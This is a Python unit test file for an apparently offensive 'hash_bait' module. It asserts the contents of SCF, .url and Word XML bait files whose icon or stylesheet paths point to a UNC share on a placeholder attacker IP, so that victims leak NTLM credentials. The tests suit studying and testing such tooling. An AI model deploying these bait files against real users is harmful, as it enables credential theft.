"""Unit tests for the hash_bait module (loads fine without impacket).

Run: python3 -m unittest discover -s tests
"""

import importlib.util
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

_spec = importlib.util.spec_from_file_location(
    "hash_bait_mod", ROOT / "modules" / "auxiliary" / "attack" / "hash_bait.py"
)
hb = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(hb)


class TestPayloads(unittest.TestCase):
    def test_scf_shape(self):
        content = hb.make_scf("10.10.14.5")
        self.assertIn("[Shell]", content)
        self.assertIn("IconFile=\\\\10.10.14.5\\tools\\nc.ico", content)
        self.assertIn("ToggleDesktop", content)

    def test_url_keeps_literal_username_var(self):
        # %USERNAME% must survive verbatim — it expands on the VICTIM,
        # which is what attributes the browse to a user
        content = hb.make_url("10.10.14.5")
        self.assertIn("IconFile=\\\\10.10.14.5\\%USERNAME%.icon", content)

    def test_xml_stylesheet_unc(self):
        content = hb.make_xml("10.10.14.5")
        self.assertIn('mso-application progid="Word.Document"', content)
        self.assertIn('type="text/xsl" href="\\\\10.10.14.5\\bait.xsl"',
                      content)
        self.assertTrue(content.endswith("<root/>\n"))

    def test_all_kinds_have_builders(self):
        for kind in hb.PAYLOAD_KINDS:
            self.assertIn(kind, hb.BUILDERS)
            self.assertTrue(hb.BUILDERS[kind]("x"))


class TestRequirements(unittest.TestCase):
    def test_declares_impacket(self):
        self.assertIn("impacket", hb.HashBait.requirements)

    def test_module_loads_without_impacket(self):
        self.assertIsNotNone(hb.HashBait)


if __name__ == "__main__":
    unittest.main()
